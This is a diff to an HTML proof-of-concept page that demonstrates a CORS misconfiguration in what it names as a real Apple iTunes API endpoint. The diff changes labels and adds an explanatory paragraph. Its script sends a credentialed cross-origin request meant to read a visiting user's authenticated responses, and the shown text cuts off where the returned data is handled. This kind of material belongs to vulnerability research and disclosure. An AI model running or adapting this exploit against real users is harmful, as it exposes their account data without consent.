@@ -5,14 +5,15 @@
 </head>
 <body>
     <h1>CORS Exploit Proof of Concept</h1>
-    <button id="exploitBtn">Exploit</button>
-    <pre id="response">Click the button to send the request.</pre>
+    <p>This PoC demonstrates the CORS misconfiguration. The server reflects the Origin header, allowing any domain to interact with the API.</p>
+    <button id="exploitBtn">Send Request</button>
+    <pre id="response">Click the button to test the vulnerability.</pre>
 
     <script>
         document.getElementById('exploitBtn').addEventListener('click', () => {
             fetch('https://uclient-api.itunes.apple.com', {
                 method: 'GET',
-                credentials: 'include' // Include cookies and credentials
+                credentials: 'include' // Include cookies or authentication tokens
             })
             .then(response => response.text())
             .then(data => {
